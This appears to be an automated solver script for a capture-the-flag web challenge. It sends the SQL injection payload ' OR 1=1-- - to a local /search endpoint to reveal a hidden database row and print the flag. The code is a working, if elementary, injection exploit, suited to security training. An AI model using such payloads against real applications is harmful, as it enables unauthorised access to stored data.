#!/usr/bin/env python3
"""Automated solver for challenge 2 - search-and-destroy.

Steps:
  1. GET /search?q= and confirm the normal page does not leak the flag.
  2. GET /search?q=' OR 1=1-- - to break out of the LIKE string, drop the
     hidden = 0 filter, and comment out the trailing SQL.
  3. Read the hidden book row and print the flag found in the HTML.
"""

import re
import sys

import requests

FLAG_RE = re.compile(r"ingehack\{[^}]+\}")
PAYLOAD = "' OR 1=1-- -"


def log(message):
    print("[*] " + message, file=sys.stderr)


def fail(message):
    print("[-] " + message, file=sys.stderr)
    sys.exit(1)


def main():
    base = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost:8002"
    session = requests.Session()

    # 1. Sanity check: the ordinary search must not contain the flag.
    normal = session.get(base + "/search", params={"q": ""}, timeout=10)
    normal.raise_for_status()
    if FLAG_RE.search(normal.text):
        fail("the flag is already visible on the normal page")
    log("normal search does not expose the flag")

    # 2. SQL injection: close the quote, add an always-true condition, and
    #    comment out the rest of the query. SQLite treats "-- " as a comment.
    injected = session.get(base + "/search", params={"q": PAYLOAD}, timeout=10)
    injected.raise_for_status()
    log("sent payload: " + PAYLOAD)

    # 3. The hidden row is now in the results table with the flag in its title.
    match = FLAG_RE.search(injected.text)
    if not match:
        fail("flag not found after SQL injection")
    print(match.group(0))


if __name__ == "__main__":
    main()
